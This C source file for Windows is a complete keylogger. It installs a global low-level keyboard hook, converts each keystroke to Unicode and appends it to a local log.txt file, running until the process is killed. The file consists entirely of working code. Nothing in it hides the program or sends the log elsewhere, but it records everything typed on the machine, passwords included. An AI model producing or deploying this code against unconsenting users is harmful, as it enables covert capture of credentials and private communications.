#include <stdio.h>
#include <windows.h>
#include <assert.h>

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

// Runs on Windows 32 or 64 OS
#ifdef _WIN32
int main () {
	// Setup keyboard input hook
	hook= SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	MSG msg;

	if (hook == NULL)
		exit(1);
	
	// Loops until process is killed / system shutdown
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);	
	}

	UnhookWindowsHookEx(hook);
	return 0;
}

// Function gets called on keyboard event
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *key;
	FILE *file;
	BYTE kbState[256];
	WCHAR buffer[5];
	int len;
	
	// Ensure params are keyboard actions
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
		key= (KBDLLHOOKSTRUCT *) lParam;
	
		GetKeyboardState(kbState);
		len= ToUnicode(key->vkCode, key->scanCode, kbState, buffer, 4, 0);
		
		// Write to log file
		if (len > 0) {
			// Properly terminate string to write
			buffer[len]= L'\0';
			// Append file with utf-8 encoding
			file= _wfopen(L"log.txt", L"a+, ccs=UTF-8");
			if (file != NULL) {
				fwprintf(file, L"%s", buffer);
				fclose(file);					
			}
		}
	}
	
	// Pass keyboard event to next hook
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

#endif

